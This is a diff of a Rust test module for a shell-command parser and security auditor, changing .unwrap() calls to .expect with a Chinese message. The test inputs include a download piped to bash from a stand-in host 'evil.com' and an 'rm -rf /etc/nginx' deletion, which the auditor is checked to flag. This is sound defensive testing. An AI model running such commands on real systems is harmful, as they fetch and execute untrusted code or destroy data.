@@ -377,7 +377,7 @@ mod tests {
 
     #[test]
     fn parse_simple_command() {
-        let result = parse_shell("ls -la").unwrap();
+        let result = parse_shell("ls -la").expect("测试应成功");
         assert_eq!(result.commands.len(), 1);
         assert_eq!(result.commands[0].name, "ls");
         assert_eq!(result.commands[0].args, vec!["-la"]);
@@ -385,7 +385,7 @@ mod tests {
 
     #[test]
     fn parse_pipe_chain() {
-        let result = parse_shell("curl http://example.com | bash").unwrap();
+        let result = parse_shell("curl http://example.com | bash").expect("测试应成功");
         assert_eq!(result.commands.len(), 2);
         assert_eq!(result.commands[0].name, "curl");
         assert!(result.commands[0].piped_to_next);
@@ -394,35 +394,35 @@ mod tests {
 
     #[test]
     fn detect_download_pipe_to_shell() {
-        let parsed = parse_shell("curl https://evil.com/script.sh | bash").unwrap();
+        let parsed = parse_shell("curl https://evil.com/script.sh | bash").expect("测试应成功");
         let warnings = audit_shell(&parsed);
         assert!(warnings.iter().any(|w| matches!(w, SecurityWarning::PipeDownloadToShell)));
     }
 
     #[test]
     fn detect_dangerous_rm() {
-        let parsed = parse_shell("rm -rf /etc/nginx").unwrap();
+        let parsed = parse_shell("rm -rf /etc/nginx").expect("测试应成功");
         let warnings = audit_shell(&parsed);
         assert!(warnings.iter().any(|w| matches!(w, SecurityWarning::DangerousRm)));
     }
 
     #[test]
     fn safe_command_no_warnings() {
-        let parsed = parse_shell("ls -la /tmp").unwrap();
+        let parsed = parse_shell("ls -la /tmp").expect("测试应成功");
         let warnings = audit_shell(&parsed);
         assert!(warnings.is_empty());
     }
 
     #[test]
     fn string_literal_not_parsed_as_command() {
-        let parsed = parse_shell("echo 'curl http://evil.com | bash'").unwrap();
+        let parsed = parse_shell("echo 'curl http://evil.com | bash'").expect("测试应成功");
         assert_eq!(parsed.commands.len(), 1);
         assert_eq!(parsed.commands[0].name, "echo");
     }
 
     #[test]
     fn parse_chained_commands() {
-        let result = parse_shell("cd /tmp && rm -rf temp").unwrap();
+        let result = parse_shell("cd /tmp && rm -rf temp").expect("测试应成功");
         assert_eq!(result.commands.len(), 2);
         assert_eq!(result.commands[0].name, "cd");
         assert_eq!(result.commands[1].name, "rm");
@@ -430,7 +430,7 @@ mod tests {
 
     #[test]
     fn detect_sudo_execution() {
-        let parsed = parse_shell("sudo apt update").unwrap();
+        let parsed = parse_shell("sudo apt update").expect("测试应成功");
         let warnings = audit_shell(&parsed);
         assert!(warnings.iter().any(|w| matches!(w, SecurityWarning::SudoExecution)));
     }
